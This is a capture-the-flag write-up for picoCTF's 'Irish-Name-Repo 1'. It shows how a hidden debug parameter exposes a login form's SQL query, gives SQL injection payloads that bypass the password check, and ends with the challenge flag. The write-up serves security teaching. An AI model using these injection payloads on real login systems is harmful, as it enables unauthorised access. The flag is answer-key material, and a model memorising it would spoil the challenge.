**Tristan Gomez**

# Irish-Name-Repo 1

### Author: Chris Hensler

### Description: 

`
There is a website running at https://jupiter.challenges.picoctf.org/problem/50009/ (link) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
`

### Hints:

 * There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
 * Try to think about how the website verifies your login.

### Step 1

Upon first navigating to the challenge site, we are greeted by a fun "List 'o the Irish!" page displaying Irish celebrities. If we click the hamburger menu icon in the top left corner of the page, we see "Support" and "Admin Login" pages. Since we want to login, lets see the admin page.

### Step 2

On the "Admin Login" page we can see a generic login form needing a username and password. Inspecting the HTML of the page, we see that the form is using **POST** to `login.php`. The form fields are `username` and `password` in the **POST**, but we have a hidden `debug` parameter that is set to 0.<br />

Knowing these parameters, let's set the debug parameter to `1` and craft our full payload which looks like:

```
exploit = {
    'username' : 'test',
    'password' : 'test',
    'debug' : '1'
}
```

Using the Python Requests library, I will send this as a payload to `/login.php`. Our response looks like:

```
<pre>
username: test
password: test
SQL query: SELECT * FROM users WHERE name='test' AND password='test'
</pre>
<h1>Login failed.</h1>
```

Ooooh, setting the debug flag allows us to see the backend query being run. With this information, we can craft an exploit that will allow us to bypass this login page.

### Step 3

Below are two slightly different payloads, both will work on this challenge:

```
admin' --
```

```
admin' /*
```

These payloads will be sent in the `username` field. Our payload sets the username to 'admin', but we then close the `username` field using a single quote.  Add a space then `--` or `/*` to comment out `AND password=` completely bypassing the password field. <br />

Our new payload will be

```
exploit = {
  'username' : """admin' --"""
  
  # use whatever comment syntax you desire
  # 'username' : """admin' /*"""
  
  'password' : 'doesnt matter'
}
```
<br />

Send the payload using Python requests or just directly enter it on the challenge page. You will successfully login and be greeted by:

```
Logged in!
Your flag is:  picoCTF{s0m3_SQL_fb3fe2ad}
```

**FLAG: picoCTF{s0m3_SQL_fb3fe2ad}**
